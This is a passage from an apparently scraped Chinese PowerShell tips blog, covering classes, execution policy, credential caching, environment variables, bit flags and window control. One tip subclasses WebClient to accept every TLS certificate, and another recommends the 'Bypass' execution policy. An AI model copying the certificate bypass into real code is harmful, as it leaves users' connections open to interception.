-AssemblyName System.Speech [TextToSpeech]::Synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer } # convert text to speech static Speak([string]$text) { [TextToSpeech]::Synthesizer.Speak($text) }} “TextToSpeech“ 类包装了文本转语音的一切需要。它使用了静态的构造函数（当定义类型的时候执行）和一个静态方法，所以不需要实例化一个对象。立刻就可以使用 “Speak“ 方法： 123# since this class uses static constructors and methods, there is no need# to instantiate an object[TextToSpeech]::Speak('Hello World!') 如果您不用“静态”成员来做相同的事情，这个类会长得十分相似。您只需要移除所有 “static“ 关键字，并且通过 $this 代替类型名来存取类的属性： 1234567891011121314151617181920#requires -Version 5.0class TextToSpeech{ # store the initialized synthesizer here hidden $synthesizer # static constructor, gets called whenever the type is initialized TextToSpeech() { Add-Type -AssemblyName System.Speech $this.Synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer } # convert text to speech Speak([string]$text) { $this.Synthesizer.Speak($text) }} 最显著的区别可能是在用户端：用户现在需要先实例化一个对象： 12$speaker = [TextToSpeech]::new()$speaker.Speak('Hello World!') 所以使用规则提炼如下： 使用静态成员来实现只需要存在一次的功能（所以文本到语音转换器是一个静态类的好例子） 使用动态成员来实现需要在多于一个实例中同时存在（这样用户可以根据需要实例化任意多个独立的对象）的功能。","link":"/2017/02/13/classes-static-members-part-6/"},{"title":"PowerShell 技能连载 - 检查 Execution Policy","text":"execution policy 决定了 PowerShell 能执行哪类脚本。您需要将 execution policy 设置成 Undefined、Restricted，或 Default 之外的值，来允许脚本执行。 对于没有经验的用户，推荐使用 “RemoteSigned“。它可以运行本地脚本，也可以运行位于您信任的网络域的文件服务器上的脚本。它不会运行从 internet 上下载的脚本，或从其它非信任的源获取的脚本，除非这些脚本包含合法的数字签名。 以下是查看和设置当前 execution policy 的方法。 123456789PS C:\\&gt; Get-ExecutionPolicyRestrictedPS C:\\&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ForcePS C:\\&gt; Get-ExecutionPolicyRemoteSignedPS C:\\&gt; 当您使用 “CurrentUser“ 作用域，那么不需要管理员权限来更改这个设置。这是您个人的安全带，而不是公司级别的安全边界。这个设置将会保持住直到您改变它。 如果您需要确保确保可以无人值守地运行任何地方的脚本，您可能需要使用 “Bypass“ 设置，而不是 “RemoteSigned“。”Bypass“ 允许运行任意位置的脚本，而且不像 ““Unrestricted”“ 那样会弹出确认对话框。","link":"/2017/02/14/checking-execution-policy/"},{"title":"PowerShell 技能连载 - 检测有问题的 Execution Policy 设置","text":"PowerShell 用执行策略 (execution policy) 来决定是否执行某个脚本。实际上定义执行策略可以定义 5 种作用域。要查看这所有五种情况，请使用这个命令： 123456789PS C:\\&gt; Get-ExecutionPolicy -List Scope ExecutionPolicy ----- ---------------MachinePolicy UndefinedUserPolicy Undefined Process UndefinedCurrentUser RemoteSignedLocalMachine Undefined 要确定生效的设置，PowerShell 会从上到下遍历这些作用域，然后取第一个非 “Undefined“ 设置。如果所有作用域都设置成 “Undefined“，那么 PowerShell 将使用 “Restricted“ 设置，并且阻止脚本执行。这是缺省的行为。 请永远保持 “MachinePolicy“ 和 “UserPolicy“ 作用域设置成 “Undefined“。这些作用域智能由组策略集中设置。如果它们设置成任何非 “Undefined“ 的值，用户则无法改变生效的设置。 有些公司使用这种方式来限制脚本的执行，它们用 execution policy 作为安全的屏障——而它并不是。”LocalMachine“ 作用域种的 Execution policy 永远应该是缺省值，而不应该强迫一个用户的设置。 如果 “MachinePolicy“ 或 “UserPolicy“ 有设置值，在 PowerShell 5 以及以下版本也有个 bug，可能会导致启动一个 PowerShell 脚本时延迟近 30 秒。这个延迟可能是内部导致的：PowerShell 使用 WMI 确定当前运行的进程，来决定一个 PowerShell 脚本是否作为一个组策略执行，而这种实现方式可能会造成过多的延迟。 所以如果您看见 “MachinePolicy“ 或 “UserPolicy“ 作用域中的设置不是 “Undefined“，您应该和 Active Directory 团队商量并和他们解释执行策略的目的：这是一个偏好设置，而不是一个限制设置。应该使用其它技术，例如 ““Software Restriction Policy” 来安全地限制脚本的使用。","link":"/2017/02/15/identifying-problematic-execution-policy-settings/"},{"title":"PowerShell 技能连载 - 免费的 PowerShell 起步指南","text":"如果有还不会 PowerShell 的同事，并且您希望帮助他们起步，一下是三个免费的学习资源： https://go.veeam.com/powershell-study-guide https://www.manning.com/books/exploring-powershell-automation http://community.idera.com/powershell/powertips/b/ebookv2#pi619PostSortOrder=Ascending","link":"/2017/02/16/free-guides-to-start-with-powershell/"},{"title":"PowerShell 技能连载 -用 JSON 缓存凭据","text":"当您需要将登录凭据缓存到一个文件，通常的做法是用管道将凭据传给 Export-Clixml 命令，这将会产生一个很长的 XML 文件。使用 Import-Clixml 命令，缓存的凭据可以随时导回脚本中。PowerShell 自动使用用户和机器身份来加密密码（它只能被同一个人在同一台机器上读取）。 可以用 JSON 格式来做同样的事情，并且不会产生更多凌乱的文件。只有对密码加密的部分需要人工完成。 这个例子提示输入登录凭据，然后将它们保存到桌面的 “mycred.json” 文件中，然后在记事本中打开它们，这样您可以查看它的内容并确认密码是加密的： 1234567891011121314151617181920212223$path = &quot;$home\\Desktop\\mycred.json&quot;$cred = Get-Credential$cred | Select Username,@{n=&quot;Password&quot;; e={$_.password | ConvertFrom-SecureString}} | ConvertTo-Json | Set-Content -Path $path -Encoding UTF8notepad.exe $pathTo later reuse the file and import the credential, use this:$path = &quot;$home\\Desktop\\mycred.json&quot;$o = Get-Content -Path $path -Encoding UTF8 -Raw | ConvertFrom-Json$cred = New-Object -TypeName PSCredential $o.UserName, ($o.Password | ConvertTo-SecureString)# if you entered a valid user credentials, this line# will start Notepad using the credentials retrieved from# the JSON file to prove that the credentials are# working.Start-Process notepad -Credential $cred 回头要使用该文件并导入凭据，请使用这段代码： 1234567891011$path = &quot;$home\\Desktop\\mycred.json&quot;$o = Get-Content -Path $path -Encoding UTF8 -Raw | ConvertFrom-Json$cred = New-Object -TypeName PSCredential $o.UserName, ($o.Password | ConvertTo-SecureString)# if you entered a valid user credentials, this line# will start Notepad using the credentials retrieved from# the JSON file to prove that the credentials are# working.Start-Process notepad -Credential $cred 请注意这个例子将使用存储在 JSON 文件中的凭据来启动记事本的实例。如果您在第一个示例脚本中键入了非法的登录信息，以上操作显然会失败。 也请注意密码事是以加密的方式存储的。加密是以您的账户和机器作为密钥。所以保存的密码是经过安全加密的，但是这里展示的技术只适合同一个人（在同一台机器上）希望下次再使用保存的凭据。一个使用场景是保存再您自己机器上常用的脚本凭据。","link":"/2017/02/17/caching-credentials-using-json/"},{"title":"PowerShell 技能连载 - 接触 PowerShell 6.0","text":"PowerShell 现在是开源的，而且 PowerShell 下一个主要的 release 是在开放的环境中开发。如果您希望看一眼预览版，只需要打开源项目的发布发布页面，并且下载合适的 release： https://github.com/PowerShell/PowerShell/releases 而且现在 PowerShell 6.0 是跨平台的。您可以同时找到适合 Linux 或 OS X 和 Windows 操作系统的版本。 当您下载某个了 Windows 平台的 ZIP 格式的 release，请先对文件解锁（右键单击文件，选择“属性”，然后解锁）。下一步，解压压缩包。在压缩包里，找到 powershell.exe，可以双击它启动一个新的 PowerShell 6.0 控制台。它是一个完全独立发行的 PowerShell，可以和现有的 PowerShell 版本同时运行。 12345678910111213141516171819PowerShellCopyright (C) 2016 Microsoft Corporation. All rights reserved.PS C:\\Users\\tobwe\\Downloads\\PowerShell_6.0.0-alpha.15-win10-win2k16-x64&gt; $PSVersionTableName Value---- -----PSVersion 6.0.0-alphaCLRVersionWSManStackVersion 3.0SerializationVersion 1.1.0.1PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}PSRemotingProtocolVersion 2.3GitCommitId v6.0.0-alpha.15BuildVersion 3.0.0.0PSEdition CorePS C:\\Users\\tobwe\\Downloads\\PowerShell_6.0.0-alpha.15-win10-win2k16-x64&gt; 如果您是一个开发者，请查看 GitHub 工程：您可以查看所有源代码，甚至可以加入这个版本的开发者社区。","link":"/2017/02/20/playing-with-powershell-6-0/"},{"title":"PowerShell 技能连载 - 检测宿主","text":"在过去，Microsoft 发布了两个 PowerShell 宿主 (host)：一个时基本的 PowerShell 控制台，以及更复杂的 PowerShell ISE。一些用户使用类似以下的代码来分辨脚本时运行在控制台中还是运行在 PowerShell ISE 中： 123$inISE = $psISE -ne $null&quot;Running in ISE: $inISE&quot; 然而，现在有越来越多的宿主。Visual Studio 可以作为 PowerShell 的宿主，Visual Studio Code 也可以。而且还有许多商业编辑器。所以您需要确定一个脚本是否在一个特定的环境中运行，请使用宿主标识符来代替： 1234$name = $host.Name$inISE = $name -eq 'Windows PowerShell ISE Host'&quot;Running in ISE: $inISE&quot; Each host emits its own host name, so this approach can be adjusted to any host. When you run a script inside Visual Studio Code, for example, the host name is “Visual Studio Code Host”.每个宿主会提供它的宿主名称，所以这种方法可以适用于任何宿主。例如当您在 Visual Studio Code 中运行一个脚本，宿主名会变为 “Visual Studio Code Host”。","link":"/2017/02/21/checking-host/"},{"title":"PowerShell 技能连载 - 设置环境变量","text":"当通过 PowerShell 的 “env:“ 驱动器来设置环境变量，您只需要操作其中的数据即可。它会应用到当前的 PowerShell 实例，和所有由它启动的应用程序。不过改变并不会保存。 要设置环境变量并使之持久化，请用这段代码代替： 12345$name = 'Test'$value = 'hello'$scope = [EnvironmentVariableTarget]::User[Environment]::SetEnvironmentVariable($name, $value, $scope) 这个例子设置了一个名为 “test”，值为 “hello” 的用户级别新环境变量。请注意这个改变只会影响设置这个变量之后启动的应用程序。 要彻底删除一个环境变量，请将 $value 设置成一个空字符串。","link":"/2017/02/22/setting-environment-variables/"},{"title":"PowerShell 技能连载 - 读取最新的环境变量","text":"当您在 PowerShell 中读取环境变量时，您可能会使用 “env:“ 驱动器。例如这行代码使用 %USERNAME% 环境变量，告知您执行这段代码的用户名： 1234PS C:\\&gt; $env:USERNAMEtobwePS C:\\&gt; env: 驱动器总是存取环境变量的操作集合。所以大多数情况所有环境变量（例如 “UserName”）都定义在这个集合之中。基本上，环境变量的操作集合是当一个应用程序启动时所有环境变量的“快照”，加上一些额外的信息（例如 “UserName”）。 要从系统或用户集合中读取最新的环境变量，请使用类似如下的代码： 12345$name = 'temp'$scope = [EnvironmentVariableTarget]::Machine$content = [Environment]::GetEnvironmentVariable($name, $scope)&quot;Content: $content&quot; 例如您可以使用这个技术在两个进程间通信。实践方法是，打开两个 PowerShell 控制台。现在在第一个控制台中键入以下信息： 1[Environment]::SetEnvironmentVariable(&quot;PS_Info&quot;, &quot;Hello&quot;, &quot;user&quot;) 在第二个 PowerShell 控制台中，键入这行代码来接收信息： 1[Environment]::GetEnvironmentVariable(&quot;PS_Info&quot;, &quot;user&quot;) 要清除环境变量，请在任意一个控制台中输入这行代码： 1[Environment]::SetEnvironmentVariable(&quot;PS_Info&quot;, &quot;&quot;, &quot;user&quot;)","link":"/2017/02/23/reading-environment-variables-freshly/"},{"title":"PowerShell 技能连载 - 用 Pester Tests 做测试","text":"Pester 是一个随 Windows 10 和 Windows Server 2016 发布的开源模块，可以通过 PowerShell Gallery 免费下载（需要事先安装最新版本的 PowerShellGet）： 1PS C:\\&gt; Install-Module -Name Pester -Force -SkipPublisherCheck Pester 是一个主要用来测试 PowerShell 代码的测试框架。您不仅可以用它来测试代码，而且可以用它来测试任何东西。以下是一个测试 PowerShell 版本号和一些设置的小例子： 1234567891011121314151617181920Describe 'PowerShell Basic Check' { Context 'PS Versioning' { It 'is current version' { $host.Version.Major -ge 5 -and $host.Version.Minor -ge 1 | Should Be $true } } Context 'PS Settings' { It 'can execute scripts' { (Get-ExecutionPolicy) | Should Not Be 'Restricted' } It 'does not use AllSigned' { (Get-ExecutionPolicy) | Should Not Be 'AllSigned' } It 'does not have GPO restrictions' { (Get-ExecutionPolicy -Scope MachinePolicy) | Should Be 'Undefined' (Get-ExecutionPolicy -Scope UserPolicy) | Should Be 'Undefined' } }} 当您运行它时（当然，前提是已经安装了 Pester 模块），这是得到的输出结果： 1234567891011Describing PowerShell Basic Check Context PS Versioning [+] is current version 76ms Context PS Settings [+] can execute scripts 47ms [+] does not use AllSigned 18ms [+] does not have GPO restrictions 21msPS&gt; 当然，这只是一个例子。您可以把它做详细并且将测试扩展到更多的其它设置或依赖条件。","link":"/2017/02/24/using-pester-tests-to-test-anything/"},{"title":"PowerShell 技能连载 - 显示或隐藏窗口","text":"PowerShell 可以调用 Windows 内部的 API，在这个例子中，我们想向您展示如何改变一个应用程序窗口的显示状态。比如可以最大化、最小化、隐藏或显示窗口。 这个例子使用 PowerShell 5 最新的枚举特性对 showstate 数值赋予有意义的名字。在 PowerShell 的更早版本中，只需要移除枚举部分，并在代码中直接使用合适的 showstate 数字即可。 这里的学习要点是如何使用 Add-Type 来包装一个 C# 形式的 API 方法并在 PowerShell 代码中返回一个暴露这个方法的 type： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#requires -Version 5# this enum works in PowerShell 5 only# in earlier versions, simply remove the enum,# and use the numbers for the desired window state# directlyEnum ShowStates{ Hide = 0 Normal = 1 Minimized = 2 Maximized = 3 ShowNoActivateRecentPosition = 4 Show = 5 MinimizeActivateNext = 6 MinimizeNoActivate = 7 ShowNoActivate = 8 Restore = 9 ShowDefault = 10 ForceMinimize = 11}# the C#-style signature of an API function (see also www.pinvoke.net)$code = '[DllImport(&quot;user32.dll&quot;)] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'# add signature as new type to PowerShell (for this session)$type = Add-Type -MemberDefinition $code -Name myAPI -PassThru# access a process# (in this example, we are accessing the current PowerShell host# with its process ID being present in $pid, but you can use# any process ID instead)$process = Get-Process -Id $PID# get the process window handle$hwnd = $process.MainWindowHandle# apply a new window size to the handle, i.e. hide the window completely$type::ShowWindowAsync($hwnd, [ShowStates]::Hide)Start-Sleep -Seconds 2# restore the window handle again$type::ShowWindowAsync($hwnd, [ShowStates]::Show) 请注意这个例子将 PowerShell 窗口临时隐藏 2 秒钟。您可以对任何运行中的应用程序窗口做相同的事情。只需要用 Get-Process 来查找目标进程，并使用它的 “MainWindowHandle“ 属性来发送 showstate 改变请求。 一些应用程序有多个窗口。在这种情况下，您只能针对主窗口操作，否则需要先靠其它 API 来获取子窗口的句柄集合。","link":"/2017/02/27/show-or-hide-windows/"},{"title":"PowerShell 技能连载 - Power Shell 5 的类继承（第一部分）","text":"PowerShell 5 内置了类的支持。您可以使用这个新特性来增强已有的 .NET 类的功能。以下是一个例子：创建一个包含新功能的增强的进程类。 进程通常是由 System.Diagnostics.Process 对象代表。它们只有有限的功能，并且假设没有能直接使用的以友好方式关闭一个应用程序的方法。您可以杀除进程（会丢失未保存的数据），或关闭它（用户可以取消关闭）。 以下是一个新的 继承于 System.Diagnostics.Process 的名为 AppInstance 的类。所以它拥有 Process 类中所有已有的功能，您可以增加额外的属性和方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#requires -Version 5class AppInstance : System.Diagnostics.Process{ # Constructor, being called when you instantiate a new object of # this class AppInstance([string]$Name) : base() { # launch the process, get a regular process object, and then # enhance it with additional functionality $this.StartInfo.FileName = $Name $this.Start() $this.WaitForInputIdle() } # for example, rename an existing method [void]Stop() { $this.Kill() } # or invent new functionality # Close() closes the window gracefully. Unlike Kill(), # the user gets the chance to save unsaved work for # a specified number of seconds before the process # is killed [void]Close([Int]$Timeout = 0) { # send close message $this.CloseMainWindow() # wait for success if ($Timeout -gt 0) { $null = $this.WaitForExit($Timeout * 1000) } # if process still runs (user aborted request), kill forcefully if ($this.HasExited -eq $false) { $this.Stop() } } # example of how to change a property like process priority [void]SetPriority([System.Diagnostics.ProcessPriorityClass] $Priority) { $this.PriorityClass = $Priority } [System.Diagnostics.ProcessPriorityClass]GetPriority() { if ($this.HasExited -eq $false) { return $this.PriorityClass } else { Throw &quot;Process PID $($this.Id) does not run anymore.&quot; } } # add static methods, for example a way to list all processes # variant A: no arguments static [System.Diagnostics.Process[]] GetAllProcesses() { return [AppInstance]::GetAllProcesses($false) } # variant B: submit $false to see only processes that have a window static [System.Diagnostics.Process[]] GetAllProcesses([bool]$All) { if ($All) { return Get-Process } else { return Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } } }}# you can always run static methods[AppInstance]::GetAllProcesses($true) | Out-GridView -Title 'All Processes'[AppInstance]::GetAllProcesses($false) | Out-GridView -Title 'Processes with Window'# this is how you instantiate a new process and get back# a new enhanced process object# classic way:# $notepad = New-Object -TypeName AppInstance('notepad')# new (and faster) way in PowerShell 5 to instantiate new objects:$notepad = [AppInstance]::new('notepad')# set a different process priority$notepad.SetPriority('BelowNormal')# add some text to the editor to see the close messageStart-Sleep -Seconds 5# close the application and offer to save changes for a maximum# of 10 seconds$notepad.Close(10) 如您在这个例子中所见，当您从这个类创建一个新实例时，它启动了一个新的进程，而且这些进程照常暴露出相同的属性和方法。而且，有一些新的例如 SetPriority() 和 Close() 的新方法。","link":"/2017/02/28/inheriting-classes-in-powershell-5-part-1/"},{"title":"PowerShell 技能连载 - Power Shell 5 的类继承（第二部分）","text":"以下是在 PowerShell 5 中使用新的类特性的另一个用例。在前一个例子中，我们演示了如何从 System.Diagnostics.Process 派生一个新类，从而获得代表进程的功能更强大的对象。 以下是一个从 WebClient 派生的类，WebClient 主要是用来连接网站。当您使用标准的 WebClient 对象是，它拒绝连接到证书错误的 HTTPS 网站。这是一件好事，但是有时候您仍需要连接这类网站。 123456789101112131415161718#requires -Version 5class MyWebClient : System.Net.WebClient{ MyWebClient() : base() { # with SSL certificate errors, connect anyway [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } $proxy = [System.Net.WebRequest]::GetSystemWebProxy() $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials $this.Proxy = $proxy $this.UseDefaultCredentials = $true $this.Proxy.Credentials = $this.Credentials }}$client = [mywebclient]::new()$client.DownloadString('http://www.psconf.eu') 这样，”“MyWebClient”“ 类继承于 WebClient() 并改变了 ServerCertificateValidationCallBack 的行为。它只是返回 $true，所以所有的连接都是成功的，而且证书检验变得无关紧要。","link":"/2017/03/01/inheriting-classes-in-powershell-5-part-2/"},{"title":"PowerShell 技能连载 - 使用泛型","text":"泛型可以作为实际类型的占位符，您可能会好奇为什么它会有意思。 有许多不同的数据类型没有 NULL 值。例如 Integer 和 Boolean 型，没有办法指出一个值是非法的还是未设置。您可以通过将一个 0（或者 -1）指定为某个 integer 变量的 “undefined” 值。但如果所有的数字都是合法的值呢？对于 Boolean，情况也是一样：虽然您可以定义 $false 值为 “undefined” 值，但许多情况下的确需要三种值：$true、$flase 和 undefined。 泛型是解决的办法，您可以使用 Nullable 类型根据任何合法的类型来创建自己的可空值类型。 12345[Nullable[int]]$number = $null[Nullable[bool]]$flag = $null$number$flag 用常规数据类型来做数据转换： 1234567PS C:\\&gt; [int]$null0PS C:\\&gt; [bool]$nullFalsePS C:\\&gt;","link":"/2017/03/02/working-with-generics/"},{"title":"PowerShell 技能连载 - 管理比特标志位（第一部分）","text":"有时候您会需要处理比特标志位值。一个数字中的每个比特代表一个特定的设置，并且您的代码可能需要决定一个标志位是否置位，而不能影响别的比特。 这常常需要一系列位操作。然而在 PowerShell 5 中，有一个简单得多的办法——标志位枚举。 假设有一个值 56823，并且希望知道哪个比特是置位的。您需要将该数字转换成可视化的比特： 12PS C:\\&gt; [Convert]::ToString(56823, 2)1101110111110111 如果您了解每个比特的意义，那么一个更强大的方法是定义一个枚举： 123456789101112131415161718192021222324#requires -Version 5[flags()]enum CustomBitFlags{ None = 0 Option1 = 1 Option2 = 2 Option3 = 4 Option4 = 8 Option5 = 16 Option6 = 32 Option7 = 64 Option8 = 128 Option9 = 256 Option10= 512 Option11= 1024 Option12= 2048 Option13= 4096 Option14= 8192 Option15= 16384 Option16= 32768 Option17= 65536} 对每个比特提供一个友好的名字，并且记得添加属性 [Flags]（这将允许设置多个值）。 现在要解析这个十进制值非常简单——只需要将它转换成新定义的枚举类型： 12$rawflags = 56823[CustomBitFlags]$flags = $rawflags 这时得到的结果： 12PS C:\\&gt; $flagsOption1, Option2, Option3, Option5, Option6, Option7, Option8, Option9, Option11, Option12, Option13, Option15, Option16 如果您只希望检测某个标志位是否置位，请使用 HasFlag() 方法： 1234567PS C:\\&gt; $flags.HasFlag([CustomBitFlags]::Option1)TruePS C:\\&gt; $flags.HasFlag([CustomBitFlags]::Option4)False","link":"/2017/03/03/managing-bit-flags-part-1/"},{"title":"PowerShell 技能连载 - 管理比特标志位（第二部分）","text":"在前一个技能中我们演示了如何使用 PowerShell 5 新的枚举特性来解析bite标志位，甚至可以独立地检测每个标志位。 如果您无法使用 PowerShell 5，在早期的 PowerShell 版本中，仍然可以使用这个技术只需要通过 C# 代码来定义枚举即可： 12345678910111213141516171819202122232425262728293031323334353637383940414243# this is the decimal we want to decipher$rawflags = 56823# define an enum with the friendly names for the flags# don't forget [Flags]# IMPORTANT: you cannot change your type inside a PowerShell session!# if you made changes to the enum, close PowerShell and open a new# PowerShell!$enum = 'using System;[Flags]public enum BitFlags{ None = 0, Option1 = 1, Option2 = 2, Option3 = 4, Option4 = 8, Option5 = 16, Option6 = 32, Option7 = 64, Option8 = 128, Option9 = 256, Option10= 512, Option11= 1024, Option12= 2048, Option13= 4096, Option14= 8192, Option15= 16384, Option16= 32768, Option17= 65536}'Add-Type -TypeDefinition $enum# convert the decimal to the new enum[BitFlags]$flags = $rawflags$flags# test individual flags$flags.HasFlag([BitFlags]::Option1)$flags.HasFlag([BitFlags]::Option2) 如您所见，从十进制数转换到新的枚举类型使用正常而且非常简单： 1234PS C:\\&gt; [BitFlags]6625Option1, Option6, Option7, Option8, Option9, Option12, Option13PS C:\\&gt;","link":"/2017/03/06/managing-bit-flags-part-2/"},{"title":"PowerShell 技能连载 - 管理比特标志位（第三部分）","text":"对十进制数设置比特标志位不是很难，但是不够直观。以下是一个快速的新方法，演示如何设置或取消一个数字中特定的比特： 1234567891011121314151617$decimal = 6254[Convert]::ToString($decimal, 2)# set bit 4$bit = 4$decimal = $decimal -bor [Math]::Pow(2, $bit)[Convert]::ToString($decimal, 2)# set bit 0$bit = 0$decimal = $decimal -bor [Math]::Pow(2, $bit)[Convert]::ToString($decimal, 2)# clear bit 1$bit = 1$decimal = $decimal -band -bnot [Math]::Pow(2, $bit)[Convert]::ToString($decimal, 2) 结果演示了代码做了什么。ToString() 从右到左显示比特，所以第 0 比特是在最右边。在第二行和第三行，设置了两个独立的比特位，而并不影响其它位。在最后一行中，清除了一个比特位。 12341100001101110110000111111011000011111111100001111101","link":"/2017/03/07/managing-bit-flags-part-3/"},{"title":"PowerShell 技能连载 - 管理比特标志位（第四部分）","text":"在 PowerShell 5 中，对枚举的新支持特性使得处理比特位比您在前面的 PowerShell 技能中看到的简单得多。现在设置或清除比特位不再需要冗长的逻辑操作符。 我们先定义一个枚举类型，这样更好管理十进制数： 12345678910111213141516#requires -Version 5[Flags()]enum GardenPartyItems{ Chair = 0 Table = 1 Barbecue = 2 Fridge = 4 Candle = 8 Knife = 16}$decimal = 11[GardenPartyItems]$flags = $decimal$flags 现在，十进制数的比特位可以很容易地转化为 GardenPartyItem 的列表： 1234PS C:\\&gt; [GardenPartyItems]11Table, Barbecue, CandlePS C:\\&gt; 注意：将十进制数转换为枚举型时，请确保枚举型中定义了所有的比特。如果十进制数太大，包含枚举型之外的比特时，转换会失败。 要增加一个新的标志位，请试试以下的代码： 123456789PS C:\\&gt; $flagsTable, Barbecue, CandlePS C:\\&gt; $flags += [GardenPartyItems]::KnifePS C:\\&gt; $flagsTable, Barbecue, Candle, KnifePS C:\\&gt; 要移除一个标志位，请试试以下代码： 123456789PS C:\\&gt; $flagsTable, Barbecue, Candle, KnifePS C:\\&gt; $flags -= [GardenPartyItems]::CandlePS C:\\&gt; $flagsTable, Barbecue, KnifePS C:\\&gt; 然而，实际上并没有看起来这么简单。当移除一个已有的标志位，没有问题。但移除一个没有置位的标志位，会把比特值搞乱： 1234567891011121314PS C:\\&gt; $flagsTable, Barbecue, CandlePS C:\\&gt; $flags -= [GardenPartyItems]::CandlePS C:\\&gt; $flagsTable, BarbecuePS C:\\&gt; $flags -= [GardenPartyItems]::CandlePS C:\\&gt; $flags-5PS C:\\&gt; 所以 PowerShell 在自动处理二进制算法方面明显还不够智能。要安全地使用该功能，您还是要用二进制操作符。要移除标志位，请使用 -band 和 -bnot： 1234567891011121314PS C:\\&gt; $flagsTable, Barbecue, CandlePS C:\\&gt; $flags = $flags -band -bnot [GardenPartyItems]::CandlePS C:\\&gt; $flagsTable, BarbecuePS C:\\&gt; $flags = $flags -band -bnot [GardenPartyItems]::CandlePS C:\\&gt; $flagsTable, BarbecuePS C:\\&gt; 要设置标志位，请使用 -bor： 1234567891011121314PS C:\\&gt; $flagsTable, Barbecue, CandlePS C:\\&gt; $flags = $flags -bor [GardenPartyItems]::KnifePS C:\\&gt; $flagsTable, Barbecue, Candle, KnifePS C:\\&gt; $flags = $flags -bor [GardenPartyItems]::KnifePS C:\\&gt; $flagsTable, Barbecue, Candle, KnifePS C:\\&gt; 在所有这些操作中，实际上是在操作一个十进制数： 12PS C:\\&gt; [Int]$flags19 相当棒，对吧？","link":"/2017/03/08/managing-bit-flags-part-4/"},{"title":"PowerShell 技能连载 - 探索对象","text":"在 PowerShell 中，一切都是用对象描述。以下是一个检查任意对象并将它的成员以文本的方式复制到剪贴板的单行代码： 12345&quot;Hello&quot; | Get-Member | Format-Table -AutoSize -Wrap | Out-String -Width 150 | clip.exe 只需要将 “Hello” 替换成任何变量或命令，然后看看复制了什么到剪贴板中。您可以将信息粘贴到文本编辑器或文字处理器中，并将它打印出来或转成 PDF 备用。","link":"/2017/03/09/explore-objects/"},{"title":"PowerShell 技能连载 - 危险的临时文件！","text":"内部的系统功能往往十分有用，但请确保真正了解它们的功能。 一个特别常见的系统方法叫做 GetTempFileName() ，能够创建临时文件名。而当您进一步观察的时候，您会发现它不仅创建临时文件名，而且还创建了临时文件： 12$file = [System.IO.Path]::GetTempFileName()Test-Path -Path $file 所以如果在脚本中只是使用这个方法来创建临时文件名的话，会留下一大堆孤立的文件。","link":"/2017/03/10/dangerous-temp-files/"},{"title":"PowerShell 技能连载 - 探索类型加速器","text":"PowerShell 使用了大量所谓类型加速器来简化过长的 .NET 类型名。例如 “System.DirectoryServices.DirectoryEntry” 可以简化为 “ADSI”。 当您需要查询一个类型的完整名称时，您可以获取到实际的完整 .NET 类型名： 1234PS C:\\&gt; [ADSI].FullNameSystem.DirectoryServices.DirectoryEntryPS C:\\&gt; 以下代码在 PowerShell 中输出所有的内置 .NET 类型加速器： 12[PSObject].Assembly.GetType(&quot;System.Management.Automation.TypeAccelerators&quot;)::get | Out-GridView 除了显式的类型加速器之外，还有一个 PowerShell 内置的规则：在 System 命名空间中的类型加速器可以省略命名空间。所以以下的表达完全一致： 12345678PS C:\\&gt; [int].FullNameSystem.Int32PS C:\\&gt; [System.Int32].FullNameSystem.Int32PS C:\\&gt; [Int32].FullNameSystem.Int32","link":"/2017/03/13/exploring-type-accelerators/"},{"title":"PowerShell 技能连载 - 快速创建对象数组","text":"以下是一个用内置的 CSV 处理器生成对象数组的代码实例： 123456789101112131415$csv = @'PC,DatePC82012,2017-02-28PC82038,2017-02-28PC83073,2017-02-28PC84004,2017-02-28PC84009,2017-02-28PC84015,2017-02-28PC90435,2017-02-28'@$data = $csv | ConvertFrom-Csv$data$data | Out-GridView 如果一个脚本需要一个静态的服务器、连接数据或其他信息的列表，这种方式会很有用。","link":"/2017/03/14/creating-object-arrays-on-the-fly/"},{"title":"PowerShell 技能连载 - Where-Object 和 .Where()","text":"从 PowerShell 4 开始，当您不想使用管道的时候，可以使用 Where() 和 ForEach() 方法来代替 Where-Object 和 ForEach-Object。 所以如果您已经将所有数据加载到一个变量中，那么非流式操作会更高效： 123456$Services = Get-Service# streaming$Services | Where-Object { $_.Status -eq 'Running' }# non-streaming$Services.Where{ $_.Status -eq 'Running' } 要节约资源，最有效地方法仍然是使用流式管道，而不是用变量： 1Get-Service | Where-Object { $_.Status -eq 'Running' } 请注意 Where-Object 和 .Where() 使用不同的数组类型，所以它们的输出技术上是不同的： 12345PS C:\\&gt; (1..19 | Where-Object { $_ -gt 10 }).GetType().FullNameSystem.Object[]PS C:\\&gt; ((1..19).Where{ $_ -gt 10 }).GetType().FullNameSystem.Collections.ObjectModel.Collection`1[[System.Management.Automation.PSObject, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]","link":"/2017/03/15/where-object-and-where/"},{"title":"PowerShell 技能连载 - 查找所有含桌面的配置文件","text":"这一行代码能够列出所有本地用户配置文件中的桌面——请确保以管理员身份运行这行代码才能查看其他人的配置文件： 1Resolve-Path -Path C:\\users\\*\\Desktop -ErrorAction SilentlyContinue 如果您只想获得配置文件中包含 “Desktop” 文件夹的用户名，请用以下代码： 1234Resolve-Path -Path C:\\users\\*\\Desktop -ErrorAction SilentlyContinue | ForEach-Object { $_.Path.Split('\\')[-2] } 这段代码获取路径并用反斜杠将它们分割，创建一个路径元素的数组。下标 -2 是指倒数第二个元素，即用户名。","link":"/2017/03/16/finding-all-profiles-with-desktop/"},{"title":"PowerShell 技能连载 - 限制文本的长度（第一部分）","text":"如果您想将一个文本的长度限制在某一个长度，以下是一个简单的方法： 1234$text = 'this is a long text'$MaxLength = 10$text.PadRight($MaxLength).Substring(0,$MaxLength) 这段代码首先对文本填充，以防它比最大长度还短，然后使用 Substring() 裁剪掉多余的文本。","link":"/2017/03/17/texts-with-maximum-length-part-1/"},{"title":"PowerShell 技能连载 - 